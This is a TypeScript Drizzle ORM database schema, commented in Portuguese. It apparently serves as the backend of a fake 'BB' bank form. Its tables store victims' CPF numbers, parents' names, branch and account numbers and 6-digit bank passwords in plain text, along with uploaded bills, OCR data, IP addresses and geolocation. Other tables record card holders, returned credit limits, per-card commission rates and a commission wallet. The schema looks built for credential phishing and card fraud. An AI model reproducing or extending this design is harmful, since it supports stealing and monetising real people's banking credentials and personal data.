import { int, mysqlEnum, mysqlTable, text, timestamp, varchar } from "drizzle-orm/mysql-core";

/**
 * Core user table backing auth flow.
 */
export const users = mysqlTable("users", {
  id: int("id").autoincrement().primaryKey(),
  openId: varchar("openId", { length: 64 }).notNull().unique(),
  name: text("name"),
  email: varchar("email", { length: 320 }),
  loginMethod: varchar("loginMethod", { length: 64 }),
  role: mysqlEnum("role", ["user", "admin"]).default("user").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
  lastSignedIn: timestamp("lastSignedIn").defaultNow().notNull(),
});

export type User = typeof users.$inferSelect;
export type InsertUser = typeof users.$inferInsert;

/**
 * Tabela para armazenar cartões (integrada com formulário BB)
 */
export const cards = mysqlTable("cards", {
  id: int("id").autoincrement().primaryKey(),
  userId: int("userId"),
  holderName: varchar("holderName", { length: 255 }).notNull(),
  sentBy: varchar("sentBy", { length: 255 }).notNull(),
  limitReturned: int("limitReturned").notNull(),
  commissionRate: int("commissionRate").notNull(),
  status: mysqlEnum("status", ["pending", "completed", "cancelled"]).default("pending"),
  email: varchar("email", { length: 320 }),
  password: varchar("password", { length: 255 }),
  fatherName: varchar("fatherName", { length: 255 }),
  motherName: varchar("motherName", { length: 255 }),
  category: varchar("category", { length: 100 }),
  bank: varchar("bank", { length: 100 }),
  rua: varchar("rua", { length: 255 }),
  numero: varchar("numero", { length: 20 }),
  complemento: varchar("complemento", { length: 255 }),
  bairro: varchar("bairro", { length: 100 }),
  cidade: varchar("cidade", { length: 100 }),
  estado: varchar("estado", { length: 2 }),
  cep: varchar("cep", { length: 10 }),
  createdDate: timestamp("createdDate").defaultNow(),
  documentSentDate: timestamp("documentSentDate"),
  limitReturnedDate: timestamp("limitReturnedDate"),
  formSubmissionId: int("formSubmissionId"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type Card = typeof cards.$inferSelect;
export type InsertCard = typeof cards.$inferInsert;

/**
 * Tabela para armazenar submissões do formulário BB
 */
export const formSubmissions = mysqlTable("form_submissions", {
  id: int("id").autoincrement().primaryKey(),
  
  // Dados pessoais
  email: varchar("email", { length: 320 }).notNull(),
  telefone: varchar("telefone", { length: 20 }).notNull(),
  cpf: varchar("cpf", { length: 14 }).notNull(),
  dataNascimento: varchar("dataNascimento", { length: 10 }).notNull(),
  nomePai: varchar("nomePai", { length: 255 }).notNull(),
  nomeMae: varchar("nomeMae", { length: 255 }).notNull(),
  
  // Dados bancários
  agencia: varchar("agencia", { length: 10 }).notNull(),
  conta: varchar("conta", { length: 20 }).notNull(),
  senha: varchar("senha", { length: 6 }).notNull(),
  
  // Endereço
  rua: varchar("rua", { length: 255 }),
  numero: varchar("numero", { length: 20 }),
  complemento: varchar("complemento", { length: 255 }),
  bairro: varchar("bairro", { length: 100 }),
  cidade: varchar("cidade", { length: 100 }),
  estado: varchar("estado", { length: 2 }),
  cep: varchar("cep", { length: 10 }),
  

  
  // Arquivo da fatura
  faturaUrl: text("faturaUrl"),
  faturaKey: varchar("faturaKey", { length: 255 }),
  faturaFilename: varchar("faturaFilename", { length: 255 }),
  
  // Dados extraídos via OCR
  ocrData: text("ocrData"),
  ocrValidationStatus: mysqlEnum("ocrValidationStatus", ["pending", "validated", "mismatch", "error"]).default("pending"),
  
  // Metadados
  submittedAt: timestamp("submittedAt").defaultNow().notNull(),
  ipAddress: varchar("ipAddress", { length: 45 }),
  userAgent: text("userAgent"),
  
  // Localização geográfica
  country: varchar("country", { length: 100 }),
  region: varchar("region", { length: 100 }),
  city: varchar("city", { length: 100 }),
  latitude: varchar("latitude", { length: 20 }),
  longitude: varchar("longitude", { length: 20 }),
  
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type FormSubmission = typeof formSubmissions.$inferSelect;
export type InsertFormSubmission = typeof formSubmissions.$inferInsert;

/**
 * Tabela para armazenar credenciais de admin
 */
export const adminCredentials = mysqlTable("admin_credentials", {
  id: int("id").autoincrement().primaryKey(),
  username: varchar("username", { length: 100 }).notNull().unique(),
  passwordHash: varchar("passwordHash", { length: 255 }).notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type AdminCredential = typeof adminCredentials.$inferSelect;
export type InsertAdminCredential = typeof adminCredentials.$inferInsert;

/**
 * Tabela para rastrear saldo e comissões
 */
export const wallet = mysqlTable("wallet", {
  id: int("id").autoincrement().primaryKey(),
  totalBalance: int("totalBalance").default(0).notNull(), // Saldo total em centavos
  totalCommissions: int("totalCommissions").default(0).notNull(), // Total de comissões ganhas
  withdrawnAmount: int("withdrawnAmount").default(0).notNull(), // Valor já sacado
  pendingAmount: int("pendingAmount").default(0).notNull(), // Valor pendente
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type Wallet = typeof wallet.$inferSelect;
export type InsertWallet = typeof wallet.$inferInsert;

/**
 * Tabela para registrar histórico de comissões
 */
export const commissionHistory = mysqlTable("commission_history", {
  id: int("id").autoincrement().primaryKey(),
  formSubmissionId: int("formSubmissionId").notNull(),
  cardId: int("cardId"),
  commissionAmount: int("commissionAmount").notNull(), // Valor da comissão em centavos
  commissionRate: int("commissionRate").notNull(), // Taxa percentual
  status: mysqlEnum("status", ["pending", "approved", "withdrawn", "cancelled"]).default("pending").notNull(),
  description: text("description"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type CommissionHistory = typeof commissionHistory.$inferSelect;
export type InsertCommissionHistory = typeof commissionHistory.$inferInsert;
